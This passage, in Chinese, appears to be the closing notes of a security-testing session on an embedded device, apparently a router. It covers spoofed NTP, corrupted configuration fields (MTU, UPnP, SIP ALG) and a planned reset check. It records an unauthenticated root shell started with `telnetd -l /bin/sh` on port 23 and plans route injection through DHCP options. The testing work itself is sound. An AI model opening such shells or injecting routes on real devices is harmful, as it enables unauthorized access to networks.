- **裝置時鐘被偽造的 NTP 改過兩次**（無 RTC，重開即失）。
- **`telnetd -l /bin/sh` 在 port 23 上跑著，沒有認證** —— 這是我開的，收工要拔電。
- `H601` **完全沒動**；`COMPCS` / `COMPDS` 的差異仍是 `0 / 343`（`P9-9` 尚未執行）。

## 下一場從哪裡開始

**`P9-9`（reset 按鈕）一項都沒做，而它是刻意留的。** 它會把 `COMPCS` 蓋回 `COMPDS`，
抹掉本場每一項站著的地面——而本場結束時的地面正好是一份很值錢的東西：
`DHCP_MTU_SIZE=0`、`UPNP_ENABLED=0`、`ALG_SIP_ENABLED=0` 三個被 W05 寫壞的欄位
**同時還在原地**，所以 reset 之後量它們有沒有變回 1500 / 1 / 1，是
`P8-19` 那條因果鏈的第三個獨立驗證，也是 `P9-9` 自己的預測。**兩件事一發解決。**

1. **`P9-9`**，而且前後各一份 `H601` 快照（`A3.24` 要求的）。
2. **`UPNP_ENABLED` / `ALG_SIP_ENABLED` 從第 2 站寫回 1**，那是 `P6-1`、`P8-7`、`P6-5`
   三列唯一的路——這個 build 的網頁介面沒有任何一頁可以設它們。
3. **路由注入**（DHCP opt 33 / 121 / 249）：要在網卡插 WAN 埠**之前**先讓 `udhcpc` 到期，
   或改用「先拔線再插線」逼它重新 DISCOVER。
